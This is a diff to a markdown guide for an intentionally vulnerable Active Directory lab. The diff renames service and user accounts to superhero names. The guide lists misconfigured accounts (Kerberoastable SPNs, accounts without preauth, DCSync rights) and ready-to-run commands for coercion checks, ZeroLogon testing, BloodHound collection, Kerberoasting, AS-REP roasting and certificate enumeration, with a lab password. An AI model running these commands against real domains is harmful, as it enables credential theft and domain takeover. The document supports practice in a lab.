@@ -53,13 +53,13 @@ Forest root DC for `corp.local`. **Every** classic AD attack lands here first: i
 ## Users / groups / SPNs to grep for
 
 ```
-svc_web        SPN: HTTP/web.corp.local                RC4 only, ConstrainedDelegation→ws01
-svc_sql        SPN: MSSQLSvc/sql01.corp.local:1433
-svc_nospreauth                                          DONT_REQ_PREAUTH    (AS-REP)
+svc_vision        SPN: HTTP/web.corp.local                RC4 only, ConstrainedDelegation→ws01
+svc_jarvis        SPN: MSSQLSvc/sql01.corp.local:1433
+svc_thanos                                          DONT_REQ_PREAUTH    (AS-REP)
 no_preauth_svc                                          DONT_REQ_PREAUTH    (AS-REP)
-backup_user                                             Backup Operators + reversible
-helpdesk                                                Account Operators, Print Operators, Schema Admins
-sync_user                                               DCSync (Replicating Changes + ChangesAll)
+heimdall                                             Backup Operators + reversible
+nick.fury                                                Account Operators, Print Operators, Schema Admins
+doctor.strange                                               DCSync (Replicating Changes + ChangesAll)
 developer1                                              DnsAdmins, Server Operators, many privs
 gmsa01                                                  Attacker can retrieve managed pwd
 former_admin                                            Disabled DA, attacker has GenericAll
@@ -102,11 +102,11 @@ nxc smb $DC -M petitpotam,dfscoerce,printerbug,spooler,webdav,ms17-010
 # ZeroLogon
 python3 zerologon_tester.py DC01 $DC
 # After first credential
-bloodhound-python -u alice -p 'DVADlab2024!' -d corp.local -ns $DC -c all
-nxc smb,ldap $DC -u alice -p 'DVADlab2024!' \
+bloodhound-python -u peter.parker -p 'DVADlab2024!' -d corp.local -ns $DC -c all
+nxc smb,ldap $DC -u peter.parker -p 'DVADlab2024!' \
     --users --groups --pass-pol --kerberoasting kerb.txt --asreproast asrep.txt \
     --trusted-for-delegation --password-not-required --admin-count --gmsa
-certipy find -u alice@corp.local -p 'DVADlab2024!' -dc-ip $DC -vulnerable -stdout
+certipy find -u peter.parker@corp.local -p 'DVADlab2024!' -dc-ip $DC -vulnerable -stdout
 ```
 
 ## What this host enables (forward links)
